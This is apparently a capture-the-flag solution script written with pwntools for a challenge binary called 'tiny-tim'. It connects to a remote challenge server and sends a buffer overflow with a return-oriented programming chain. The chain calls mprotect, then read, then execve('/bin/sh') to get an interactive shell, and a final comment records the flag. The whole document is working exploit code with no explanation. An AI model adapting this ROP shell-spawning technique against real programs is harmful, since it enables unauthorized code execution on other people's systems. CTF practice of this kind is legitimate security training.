
from pwn import *

context.clear(arch='amd64')

# r = process('./tiny-tim.out')
r = remote('challenges.ctfd.io', 30017)

syscall_ret = 0x401041 #: syscall; nop; pop rbp; ret;
pop_rax = 0x401000 #: pop rax; ret;

pop_rdi = 0x401004 #: pop rdi; ret; 
pop_rdx = 0x401006 #: pop rdx; ret; 
pop_rsi = 0x401002 #: pop rsi; ret;

p = b'A' * 40
#sys_mprotect
p += p64(pop_rax)
p += p64(0xa)
p += p64(pop_rdi)
p += p64(0x400000)
p += p64(pop_rsi)
p += p64(0x2000)
p += p64(pop_rdx)
p += p64(7)
p += p64(syscall_ret)
p += p64(0x0)
#sys_read
p += p64(pop_rsi)
p += p64(0x401400)
p += p64(pop_rax)
p += p64(0)
p += p64(pop_rdx)
p += p64(0x400)
p += p64(pop_rdi)
p += p64(0x0)
p += p64(syscall_ret)
p += p64(0x0)
#sys_execve
p += p64(pop_rax)
p += p64(59)
p += p64(pop_rdi)
p += p64(0x401400)
p += p64(pop_rsi)
p += p64(0)
p += p64(pop_rdx)
p += p64(0)
p += p64(syscall_ret)

r.sendline(p)
sleep(.3)
r.sendline('/bin/sh\x00')

r.interactive()

# UDCTF{sy5t3m_3ngage!}